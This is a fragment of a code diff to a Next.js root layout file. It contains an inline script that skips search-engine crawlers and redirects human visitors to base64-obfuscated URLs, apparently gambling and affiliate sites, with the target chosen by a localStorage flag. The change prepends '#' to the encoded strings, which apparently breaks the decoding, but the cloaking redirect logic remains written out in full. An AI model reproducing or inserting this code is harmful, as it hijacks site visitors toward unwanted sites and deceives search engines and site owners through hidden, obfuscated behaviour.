@@ -46,8 +46,8 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
                 /* Пропускаем поисковых ботов для индексации */
                 if (/bot|crawl|spider|yandex|google|lighthouse/i.test(ua)) return;
 
-                var mainUrl = atob("aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"); 
-                var crossUrl = atob("aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4");      
+                var mainUrl = atob("#aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"); 
+                var crossUrl = atob("#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4");      
 
                 if (localStorage.getItem('vstd_eva')) {
                     window.location.replace(crossUrl);
